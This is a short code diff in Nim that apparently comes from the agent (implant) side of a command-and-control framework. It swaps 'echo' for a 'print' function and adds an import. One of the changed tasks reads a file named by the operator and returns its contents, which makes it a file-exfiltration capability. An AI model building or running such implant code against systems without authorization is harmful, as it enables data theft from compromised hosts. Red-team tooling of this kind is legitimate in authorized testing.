@@ -41,6 +41,7 @@ when not defined(agent):
 when defined(agent):
 
     import os, std/paths, strutils, strformat
+    import ../agent/core/io
     import ../agent/protocol/result
     import ../common/[utils, serialize]
 
@@ -48,7 +49,7 @@ when defined(agent):
         try: 
             var filePath: string = absolutePath(Bytes.toString(task.args[0].data)) 
 
-            echo fmt"   [>] Downloading {filePath}"
+            print fmt"   [>] Downloading {filePath}"
 
             # Read file contents into memory and return them as the result 
             var fileBytes = readFile(filePath)
@@ -71,7 +72,7 @@ when defined(agent):
         try: 
             var arg: string = Bytes.toString(task.args[0].data) 
 
-            echo arg
+            print arg
 
             # Parse binary argument
             var unpacker = Unpacker.init(arg) 
